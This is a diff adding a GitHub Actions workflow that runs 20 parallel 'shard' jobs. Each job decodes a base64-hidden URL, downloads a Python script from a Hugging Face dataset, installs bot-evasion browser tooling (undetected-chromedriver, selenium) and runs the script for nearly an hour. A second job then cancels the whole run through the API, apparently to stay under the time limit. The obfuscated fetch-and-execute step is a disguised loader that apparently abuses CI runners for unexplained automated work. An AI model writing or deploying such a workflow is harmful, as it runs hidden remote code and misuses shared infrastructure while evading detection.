@@ -1,0 +1,104 @@
+name: Amber Shard Nexus
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: amber-shard-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Nexus Shards: parallel shard workers
+  # =================================================================
+  nexus-shards:
+    name: "Shard-${{ matrix.shard_token }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        shard_token: [S01, S02, S03, S04, S05, S06, S07, S08, S09, S10, S11, S12, S13, S14, S15, S16, S17, S18, S19, S20]
+
+    steps:
+      # #################################################################
+      # 1) Shard setup
+      # #################################################################
+      - name: Shard Setup
+        run: |
+          echo "[SETUP] Setting up Shard-${{ matrix.shard_token }} ..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # #################################################################
+      # 2) Shard payload fetch
+      # #################################################################
+      - name: Shard Payload Fetch
+        run: |
+          echo "[FETCH] Fetching shard payload..."
+          PAYLOAD_SRC=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$PAYLOAD_SRC" -o shard_payload.py
+          echo "[FETCH] Shard payload ready."
+
+      # #################################################################
+      # 3) Shard dependency install
+      # #################################################################
+      - name: Shard Dependency Install
+        run: |
+          echo "[INSTALL] Installing shard dependencies..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # 4) Shard execution (3540s max)
+      # #################################################################
+      - name: Shard Execution
+        run: |
+          echo ">> Executing Shard-${{ matrix.shard_token }} ..."
+
+          python3 shard_payload.py &
+          SHARD_PID=$!
+
+          echo ">> Shard running. Max duration: 3540 seconds."
+
+          sleep 3540
+
+          if kill -0 "$SHARD_PID" 2>/dev/null; then
+            echo ">> Max duration hit — killing shard."
+            kill -9 "$SHARD_PID"
+            echo ">> Shard killed by duration supervisor."
+          else
+            echo ">> Shard ended before max duration."
+          fi
+
+  # =================================================================
+  # Nexus Overseer: waits 59 minutes, then cancels the whole run
+  # =================================================================
+  nexus-overseer:
+    name: "Nexus Overseer"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      OVERSEER_WINDOW: 3540
+
+    steps:
+      - name: Overseer Activation
+        run: |
+          echo "[OVERSEER] Overseer active for run: ${{ github.run_id }}"
+          echo "[OVERSEER] Waiting ${OVERSEER_WINDOW} seconds before the 59-minute cutoff."
+
+          sleep "${OVERSEER_WINDOW}"
+
+          echo "[OVERSEER] Cutoff reached — sending cancel command."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[OVERSEER] Cancel command sent. All running and queued jobs will be aborted."
